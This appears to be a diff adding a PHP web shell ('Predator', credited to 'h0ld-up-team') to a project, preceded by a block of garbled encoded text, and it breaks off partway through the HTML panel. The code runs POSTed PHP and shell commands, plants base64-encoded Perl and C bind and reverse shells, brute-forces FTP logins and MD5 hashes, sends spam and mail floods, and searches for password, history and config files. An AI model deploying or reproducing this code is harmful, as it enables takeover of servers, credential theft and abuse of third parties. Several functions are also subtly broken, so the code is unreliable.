YcK1gJw7NihSAa2S3+UvTnp+nd6Eu4+pGx1xwBFFjF52r3qDc/ulVTXURnSJNL8IXlPfh9uAoJnKX8ZtNepMlxiK3CZhbjT3Ur1p3JHSTcojzywNHhvXM0FxloPM6ePNYH9ZSaTeXHi74NvWxsw64Bzxtr3sZOweWclww+3yuBGWyNYlzlOe+5vlIojRqHECzB8bJqiLNffY5+I7xwtVXEEWPIykbJhIwdDSZ3DAEdj1RCsnHlQ5I0T34zQ7bmtD20oRfO6hiW0t5pUr6oxmOJZ+Wr5qNeKEXK7V3HjafgWsuGeGsyX45nLbhTMiWs/3jegXzogdl0JSoieW81C/PbM721oJzWXtlmm+1nMsOrsdKi29T4lSd5BQq1xxX4M6JFOgNrvJhS9lgcuWyDIjJUCKUrvIsw7GnaRL3myKvGZp1Qs4r5OPJWoXdjVcxWJ5RZMxpWvVdQDjKZDqLhdFISvZZFzSQVjJF8N1Aw3fk3C+23ibzTW7z8UNXk2pDXpu9mSNU/TYr2Xes3p2YVwBNvoMBV/oLvgZq77w2jzzS8Pe+//98h6ACd+NvpCHcYzffGXzHGldzDHtp8ulvNikDktYl9J9OCJVftgPK6y3R3byWEaVuYcD+s+hlU5PtFvLLtkcgHF++fyen4Q93XbIw8VArfTaury5kzPjncz4JPhbXbxzDWxAdXu7YpKX2A25f6Hl8c+Er7uW5l4HDXc9cH3tqpkrKmi6gGMfOGioLNEavqM7pRHH/M47MpSEb5gCV33Mp16jAfImxcSQixXdiACeqsYbcO4qxdcuFmXU1/SDMmZLbT4tvhNJmO4YmMPw+05B7dbcwSWZwa/YieP0VZM/0TgYXdEBGmTRdyNY3ZvlJE5ecM+nsSKN0qgaDN5MRT5xQqwUbXbouvkzdg7m+yjG6QJmfBdrGcuciTUuv/3sePbytE8xU71mFeXy9YWKfoGBiEVzTuNYpKy+wWzaQoZfcNG+LJUoFz1RK1Y3nZbrxsKEoGnRzcqUv9jjqe21IwN1XJqajTaanpTvoNE+zqLYo5iIOgtupwj29UD8DGAmdzmhaooe20vR0sqpbvWLegY7bviaxjRXtUVmyo0FkTW4vR3+23m749bEpHYI119XPNa/OnFlda38mzzmmOWI/V8me4+XNMA7/PpHyPsdyob/ww5HWyu338k7gfGKeuCW4pZ6vgHta2YchIVlPsD4o1Qz1BxBfHeak8HRGeRbvksNQSZ4nc69++8/AXjeC7YNpzzo/gg5DuPfLEtqtIkRXAfs5AzCW2b70P0y6HeAZYa8RnFYhMn9RLsgi4pcelc5HmKBDXrGdZje8ZrBQzX8RN7S/sefAJz/FpArhZOxiyhKt7vsIcpwMXTXH7n5NP7wfWdW2ESimPJfFEDrQe5N+BZvxyxnUV8D/9aIBecdHbj/k7GSbZJGs/1uvQmIn3PtO5b7Yx1A2Lnj26rxfurq2eEcAymh4Q3Id9dxCdnPk/B9qDkyIo3BsP+SGyPpN7M9vmy/356wAjaGF+WOGhDj/NX/Aw==s
+<?php
+$auth = 0;
+
+
+
+ini_set("session.gc_maxlifetime",1);
+session_start();
+error_reporting(0);
+safe_mode();
+$name="9b534ea55d0b82c3a7e80003a84b6865";     //login = 'mylogin'
+$pass="a029d0df84eb5549c641e04a9ef389e5";     //pass  = 'mypass'
+if($auth == 1){
+if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass)
+   {
+   header("WWW-Authenticate: Basic realm=\"PanelAccess\"");
+   header("HTTP/1.0 401 Unauthorized");
+   exit("Access Denied");
+   }
+}
+
+if($_GET['kill']=='yes')
+{
+unlink($_SERVER['SCRIPT_FILENAME']);
+echo "<script>alert('Your shell script was succefully deleted!')</script>";
+}
+
+
+function md5_brute($hash,$log,$dict)
+{
+ignore_user_abort(1);
+set_time_limit(0);
+
+$fl = fopen($dict, "r");
+$fl = fopen($log, "w");
+$count = 0;
+if(!$dict){
+return "Fill 'dictionary_file' field!";
+}if(!$log){
+return "Fill 'log_file' field!";
+}elseif(!strlen($hash) == 0){
+return "Fill 'md5_hash' field!";
+}else{
+	while(!$feof($dict)){
+		$pass = fgets($dict);
+		$brute_hash = md5($pass);
+		if($brute_hash == $hash){
+			fputs($log, "$hash:$pass\n---");
+			fclose($dict);
+			fclose($log);
+			exit;
+		}else{
+			$count = $count + 1;
+			fputs($log, "$count passwords was bruted...");
+		}
+	}
+	fputs($log, "$count passwords are failed!");
+}
+fclose($dict);
+fclose($log);
+}
+
+function port_bind($port,$pass,$method)
+{
+$perl = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
+VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
+JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
+TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
+lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
+Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
+Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
+lIENPTk47DQpleGl0IDA7DQp9DQp9";
+$c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
+A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
+GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
+b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
+pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
+NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
+ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
+ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
+7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
+9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
+2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
+dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
+lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
+
+if($method=='Perl')
+	{
+		fputs($i=fopen('/tmp/shlbck','w'),base64_decode($perl));
+		fclose($i);
+		ex(which("perl")." /tmp/shlbck ".$port." &");
+		unlink("/tmp/shlbck");
+		return ex('ps -aux | grep shlbck');
+	}
+elseif($method=='C#')
+	{
+		fputs($i=fopen('/tmp/shlbck.c','w'),base64_decode($c));
+		fclose($i);
+		ex("gcc shlbck.c -o shlbck");
+		unlink('shlbck.c');
+		ex("/tmp/shlbck ".$port." ".$pass." &");
+		unlink("/tmp/shlbck");
+		return ex('ps -aux | grep shlbck');
+	}else
+	{
+	return 'Choose method';
+	}
+
+}
+
+function backconnect($ip,$port,$method)
+{
+$perl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
+aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
+hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
+sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
+kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
+KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
+OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
+
+$c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
+BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
+SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
+KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
+sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
+Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
+QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
+Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
+
+if($method=='Perl')
+	{
+		fputs($i=fopen('/tmp/shlbck','w'),base64_decode($perl));
+		fclose($i);
+		ex(which("perl")." /tmp/shlbck ".$ip." ".$port." &");
+		unlink("/tmp/shlbck");
+		return ex('netstat -an | grep -i listen');
+	}
+elseif($method=='C#')
+	{
+		fputs($i=fopen('/tmp/shlbck.c','w'),base64_decode($c));
+		fclose($i);
+		ex("gcc shlbck.c -o shlbck");
+		unlink('shlbck.c');
+		ex("/tmp/shlbck ".$ip." ".$port." &");
+		unlink("/tmp/shlbck");
+		return ex('netstat -an | grep -i listen');
+	}else
+	{
+	return 'Choose method';
+	}
+}
+
+if($_POST['type']==11){download(stripslashes($_POST['value']));};
+
+function download($dfilename)
+{
+	$file=fopen($dfilename,"r");
+	ob_clean();
+    $filename = basename($dfilename);
+    $filedump = fread($file,@filesize($dfilename));
+    fclose($file);
+    header("Content-type: ".$mime_type);
+    header("Content-disposition: attachment; filename=\"".$filename."\";");   
+    echo $filedump;
+}
+
+function flooder($logf,$to,$from,$subject,$msg,$amount,$check)
+{
+ignore_user_abort(1);
+set_time_limit(0);
+
+$fl = fopen($logf, "w");
+$count = 0;
+if(!$logf){
+return "Fill 'log_file' field!";
+}elseif(!$to){
+return "Fill 'Send to' field!";
+}elseif(!$from){
+return "Fill 'From' field!";
+}elseif(!$subject){
+return "Fill 'Subject' field!";
+}elseif(!$msg){
+return "Fill 'Message' field!";
+}elseif(!$amount){
+return "Fill 'Amount' field!";
+}else{
+	while($count < $amount){
+		mail("$to", "$subject", "$msg", "From: $from");
+		$count = $count + 1;
+		$fl = fopen($logf, "w");
+		fputs($fl, "$count flood-letters was sended...");
+		fclose($fl);	
+	}
+	if(strlen($check) != 0){
+		$check_text = "Done! $count flood-letters was sended!";
+		$check_sub = 'Check';
+		mail("$check", "$check_sub", "$check_text", "From: $from");
+		$fl = fopen($logf, "w");
+		fputs($fl, "Done! $count flood-letters was sended!");
+	}
+	else{
+		$fl = fopen($logf, "w");
+		fputs($fl, "Done! $count flood-letters was sended!");
+	}
+}
+fclose($fl);
+}
+
+function ftp_brute($host,$ftp_users,$ftp_passwd,$ftp_log)
+{
+ignore_user_abort(1);
+set_time_limit(0);
+
+$fl = fopen($ftp_users, "r");
+$fd = fopen($ftp_passwd, "r");
+$fr = fopen($ftp_log, "a+");
+if(!$host){
+return "Fill 'Host' field!";
+}elseif(!$ftp_users){
+return "Fill 'ftp_users file' field!";
+}elseif(!$ftp_passwd){
+return "Fill 'ftp_passwd file' field!";
+}elseif(!$ftp_log){
+return "Fill 'ftp_log file' field!";
+}elseif(!file_exists($ftp_users)){
+return "File ".$ftp_users." doesn't exists!";
+}elseif(!file_exists($ftp_passwd)){
+return "File ".$ftp_passwd." doesn't exists!";
+}
+else{
+	while(!feof($fd)){
+        	$pass = fgets($fd);
+                	while(!feof($fl)){
+                        	$user = fgets($fl);
+                                $connect = ftp_connect($host);
+                                if(!$connect){
+                                	fputs($fr, "Enable connect to $host\n");
+                                        exit;
+                                }else{
+                                	$auth = ftp_login($connect, $user, $pass);
+                                	if(!$auth){
+                                		ftp_quit($connect);
+                                	}
+                                	else{
+                                		fputs($fr, "$host:\n---$login:$pass\n---");
+                                		ftp_quit($connect);
+                                	} 
+                                }
+                	}
+	}
+	fputs($fr, "Done:\n");
+	fclose($fr);
+}
+fclose($fl);
+fclose($fd);
+}
+
+function spammer($from,$subject,$msg,$check,$elist,$logf)
+{
+ignore_user_abort(1);
+set_time_limit(0);
+
+$fp = fopen($elist. "r");
+$fl = fopen($logf, "w");
+$count = 0;
+if(!$from){
+return "Fill 'From' field!";
+}elseif(!$elist){
+return "Fill 'Emails list' field!";
+}elseif(!$logf){
+return "Fill 'Log File' field!";
+}elseif(!$msg){
+return "Fill 'Message' field!";
+}elseif(!$subject){
+return "Fill 'Subject' field!";
+}elseif(!file_exists($elist)){
+return "File ".$elist." doesn't exists!";
+}else{
+	while(!feof($fp)){
+		$to = fgets($fp);
+		mail("$to", "$subject", "$msg", "From: $from");
+		$count = $count + 1;
+		$fl = fopen($logf, "w");
+		fputs($fl, "$count letters was sended...");
+		fclose($fl);
+	}
+	if(strlen($check) != 0){
+		$check_text = "Done! $count letters was sended!";
+		$check_sub = 'Check';
+		mail("$check", "$check_sub", "$check_text", "From: $from");
+		$fl = fopen($logf, "w");
+		fputs($fl, "Done! $count letters was sended!\n");
+	}
+	else{
+		$fl = fopen($logf, "w");
+		fputs($fl, "Done! $count letters was sended!");
+	}
+}
+fclose($fp);
+fclose($fl);
+}
+
+function alias($in)
+{
+if($in=="find apahce config file"){return ex('find / -type f -name httpd.conf');}
+elseif($in=="find access_log files"){return ex('find / -type f -name access_log');}
+elseif($in=="find error_log files"){return ex('find / -type f -name error_log');}
+elseif($in=="find suid files"){return ex('find / -type f -perm -04000 -ls');}
+elseif($in=="find suid files in current dir"){return ex('find . -type f -perm -04000 -ls');}
+elseif($in=="find sgid files"){return ex('find / -type f -perm -02000 -ls');}
+elseif($in=="find sgid files in current dir"){return ex('find . -type f -perm -02000 -ls');}
+elseif($in=="find config.inc.php files"){return ex('find / -type f -name config.inc.php');}
+elseif($in=="find config.inc.php files in current dir"){return ex('find . -type f -name config.inc.php');}
+elseif($in=="find config* files"){return ex('find / -type f -name "config*"');}
+elseif($in=="find config* files in current dir"){return ex('find . -type f -name "config*"');}
+elseif($in=="find all writable files"){return ex('find / -type f -perm -2 -ls');}
+elseif($in=="find all writable files in current dir"){return ex('find . -type f -perm -2 -ls');}
+elseif($in=="find all writable directories"){return ex('find / -type d -perm -2 -ls');}
+elseif($in=="find all writable directories in current dir"){return ex('find . -type d -perm -2 -ls');}
+elseif($in=="find all writable directories and files"){return ex('find / -perm -2 -ls');}
+elseif($in=="find all writable directories and files in current dir"){return ex('find . -perm -2 -ls');}
+elseif($in=="find all service.pwd files"){return ex('find / -type f -name service.pwd');}
+elseif($in=="find service.pwd files in current dir"){return ex('find . -type f -name service.pwd');}
+elseif($in=="find all .htpasswd files"){return ex('find / -type f -name .htpasswd');}
+elseif($in=="find .htpasswd files in current dir"){return ex('find . -type f -name .htpasswd');}
+elseif($in=="find all .bash_history files"){return ex('find / -type f -name .bash_history');}
+elseif($in=="find .bash_history files in current dir"){return ex('find . -type f -name .bash_history');}
+elseif($in=="find all .mysql_history files"){return ex('find / -type f -name .mysql_history');}
+elseif($in=="find .mysql_history files in current dir"){return ex('find . -type f -name .mysql_history');}
+elseif($in=="find all .fetchmailrc files"){return ex('find / -type f -name .fetchmailrc');}
+elseif($in=="find .fetchmailrc files in current dir"){return ex('find . -type f -name .fetchmailrc');}
+elseif($in=="list file attributes on a Linux second extended file system"){return ex('lsattr -va');}
+elseif($in=="show opened ports"){return ex('netstat -an | grep -i listen');}
+elseif($in=="---------------------------------------------------------------------------------------------------------"){return ex('ls -la');}
+}
+
+function testperl()
+{
+	if(ex('perl -h'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+function testlynx()
+{
+	if(ex('lynx --help'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+
+function view_size($size)
+{
+ if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
+ elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
+ elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
+ else {$size = $size . " B";}
+ return $size;
+}
+
+function testfetch()
+{
+	if(ex('fetch --help'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+function testwget()
+{
+	if(ex('wget --help'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+function oracle()
+{
+	if(function_exists('ocilogon'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+function postgresql()
+{
+	if(function_exists('pg_connect'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+
+function testmssql()
+{
+	if(function_exists('mssql_connect'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+function testcurl()
+{
+	if(function_exists('curl_version'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+function testmysql()
+{
+	if(function_exists('mysql_connect'))
+	{
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		return "<font size=2 color=red>OFF</font>";
+	}
+}
+function safe_mode()
+{
+if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3)
+	{
+		$_SESSION['safe_mode'] = 1;
+		return "<font size=2 color=green>ON</font>";
+	}else{
+		$_SESSION['safe_mode'] = 0;
+		return "<font size=2 color=red>OFF</font>";
+	}
+};
+
+function ex($in)
+{
+$out = '';
+
+
+if(function_exists('exec'))
+	{
+		exec($in,$out);
+		$out = join("\n",$out);
+	}
+elseif(function_exists('passthru'))
+	{
+		ob_start();
+		passthru($in);
+		$out = ob_get_contents();
+		ob_end_clean();
+	}
+elseif(function_exists('system'))
+	{
+		ob_start();
+		system($in);
+		$out = ob_get_contents();
+		ob_end_clean();
+	}
+elseif(function_exists('shell_exec'))
+	{
+		$out = shell_exec($in);
+	}
+elseif(is_resource($f = popen($in,"r")))
+  {
+   $out = "";
+   while(!@feof($f)) { $out .= fread($f,1024); }
+   pclose($f);
+  }
+return $out;
+}
+
+function shell()
+{
+if($_POST['type']==1)
+	{		
+		eval(stripslashes($_POST['value']));
+	}
+elseif($_POST['type']==2)
+	{
+		pwd();
+		print_r(ex(stripslashes($_POST['value'])));
+	}
+elseif($_POST['type']==3)
+	{
+		if($_SESSION['safe_mode'] == 1){
+		if(($u=safe_ex('ls -la'))!='')
+		{return $u;}else{return safe_ex('dir');};
+		
+		}else{
+		if(($u=ex('ls -la'))!='')
+		{return $u;}else{return ex('dir');};
+		}
+	}
+elseif($_POST['type']==4)
+	{
+		if(file_exists(stripslashes($_POST['value'])))
+			{
+				if($safe_mode!=1){
+				echo htmlspecialchars(fread(fopen(stripslashes($_POST['value']),"rw"),filesize(stripslashes($_POST['value']))));
+				}else{
+				echo htmlspecialchars(safe_read(stripslashes($_POST['value'])));
+				};
+				$_SESSION['edit']=1;
+				$_SESSION['filename'] = $_POST['value'];
+			}else{
+				return 'File doesn\'t exists!';
+			}
+	}
+elseif($_POST['type']==5)
+	{
+		fputs(fopen($_SESSION['filename'],"w"),stripslashes($_POST['value']));
+	}
+elseif($_POST['type']==6)
+	{
+		$uploaddir = pwd();
+		if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
+		move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name); 	
+	}
+elseif($_POST['type']==7)
+	{
+		echo alias($_POST['value']);
+	}
+elseif($_POST['type']==8)
+	{
+		echo spammer(stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['check']),stripslashes($_POST['elist']),stripslashes($_POST['logf']));
+	}
+elseif($_POST['type']==9)
+	{
+		echo ftp_brute(stripslashes($_POST['host']),stripslashes($_POST['users']),stripslashes($_POST['passwd']),stripslashes($_POST['log']));
+	}
+elseif($_POST['type']==10)
+	{
+		echo flooder(stripslashes($_POST['log']),stripslashes($_POST['to']),stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['amount']),stripslashes($_POST['check']));
+	}
+elseif($_POST['type']==12)
+	{
+		echo backconnect(stripslashes($_POST['ip']),stripslashes($_POST['port']),stripslashes($_POST['method']));
+	}
+elseif($_POST['type']==13)
+	{
+		echo backconnect(stripslashes($_POST['port']),stripslashes($_POST['pass']),stripslashes($_POST['method']));
+	}
+elseif($_POST['type']==14)
+	{
+		echo md5_brute(stripslashes($_POST['hash']),stripslashes($_POST['log']),stripslashes($_POST['dict']));
+	}
+
+else 
+	{$u = ex('ls -la');
+	 if($u == ''){return ex('dir');}else{return $u;};
+	}
+
+return null;
+};
+
+function edit()
+{
+if ($_SESSION['edit'] == 1){
+$_SESSION['edit']=0;
+return "<br><center><input type=submit style=\"border:1px solid #666666;background:#333333;font-weight:bold;\" value=\"Save\"></center>";};
+}
+
+function getsystem()
+{
+	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
+};	
+
+function getserver()
+{
+	return getenv("SERVER_SOFTWARE");
+};
+
+
+function getuser()
+{
+$out = get_current_user();	
+	if($out!="SYSTEM")
+		{
+			if(($out=ex('id'))==''){$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();};
+		}
+return $out;
+};
+
+function pwd()
+{
+if($_POST['type']==3)
+	{
+		$_SESSION['pwd'] = stripslashes($_POST['value']);
+	}
+chdir($_SESSION['pwd']);
+$cwd = getcwd();
+if($u=strrpos($cwd,'/'))
+	{
+		if($u!=strlen($cwd)-1){
+		return $cwd.'/';}
+		else{return $cwd;};
+	}
+elseif($u=strrpos($cwd,'\\'))
+	{
+		if($u!=strlen($cwd)-1){
+		return $cwd.'\\';}
+		else{return $cwd;};
+	};
+}
+
+function safe_ex($in)
+{
+if($in){
+$d=dir('.');
+
+   while (false!==($file=$d->read()))
+    {
+     if ($file=="." || $file=="..") continue;
+     @clearstatcache();
+     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
+     if(!$unix){ 
+     echo date("d.m.Y	 H:i",$mtime)."	";
+     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
+     }
+     else{ 
+     $owner = @posix_getpwuid($uid);
+     $grgid = @posix_getgrgid($gid);
+     echo $inode." ";
+     echo perms(@fileperms($file));
+     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
+     echo date("d.m.Y H:i ",$mtime);
+     }
+     echo "$file\n";
+    }
+   $d->close();
+}
+
+function safe_read($in)
+{
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include("/etc/passwd");
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+
+file_get_contents($in);
+}
+
+}
+?>
+
+
+
+
+
+
+
+
+
+
+<html>
+<head>
+<title>.::Predator::.</title>
+<META http-equiv="Content-Type" content="text/html; charset=CP866">
+<style type=text/css>
+.ta {background: #333333; border:1px solid #666666; color: #FFFFFF;}
+.bt {border: 1px solid #666666;background: #333333;font-weight:bold;}
+.td1 {border:2px solid #000000;}
+.td2 {border:1px solid #000000;}
+.ram {border:1px solid #666666;background:#222222;}
+body { scrollbar-base-color: #333333}
+</style>
+<script>
+function kill()
+{
+var y;
+y = confirm('Are you really want to kill shell?');
+if(y == true)
+{
+document.location = '?kill=yes';
+}
+}
+</script>
+</head>
+<body bgcolor='#000000'>
+<center><table width=90% cellpadding=0 cellspacing=0 style="border: 1px solid #666666">
+<tr><td width=100% height=70 bgcolor='#333333' style="border-bottom: 2px solid #666666" valign=top>
+<table valign=top>
+<tr><td valign=top>
+<table valign=center class='ram'>
+<tr><td width=5% align=right>
+<font size=2 color=#888888>System:</font>
+</td>
+<td width=100%>
+<font size=2 color=red><b><?php echo getsystem();?></b></font>
+</td></tr>
+<tr><td width=5% align=right>
+<font size=2 color=#888888>Server:</font>
+</td>
+<td width=100%>
+<font size=2 color=red><b><?php echo getserver();?></b></font>
+</td></tr>
+<tr><td width=5% align=right>
+<font size=2 color=#888888>User:</font>
+</td>
+<td width=100%>
+<font size=2 color=red><b><?php echo getuser();?></b></font>
+</td></tr>
+<tr><td width=5% align=right>
+<font size=2 color=#888888>pwd:</font>
+</td>
+<td width=100%>
+<font size=2 color=red><b><?php if(strlen($u=pwd())>45){echo "...".substr($u,strlen($u)-40,40);}else{echo $u;};?></b></font>
+</td></tr>
+</table>
+</td>
+<td width=13% valign=center align=center>
+<table width=100% height=100% cellpadding=0 cellspacing=0><tr><td width=100% height=100%>
+<center>
+<a href="http://h0ld-up.info"><table cellpadding=2 cellspacing=2 style="border:1px solid #666666;background:#444444">
+<tr><td><font size=2 color=#999999>
+<center><b>.::h0ld-up-team::.<br>web-shell</b></center>
+</font></td></tr></table></a></center>
+</td></tr><tr><td height=5></td></tr><tr><td>
+<center>
+
+<input type=submit style="border:1px solid #666666;background: darkred;font-weight:bold;" value='   Kill Shell   ' onclick='kill()'>
+
+</center>
+</td></tr></table>
+
+</td>
+<td class='ram' width=45% valign=center align=center>
+<table  cellpadding=0 cellspacing=0>
+<tr><td>
+<table valign=top cellpadding=0 cellspacing=0>
+<tr><td align=right>
+<font size=2 color='#888888'>PHP-version:</font>
+</td></tr>
+<tr><td align=right>
+<font size=2 color='#888888'>MySQL:</font>
+</td></tr>
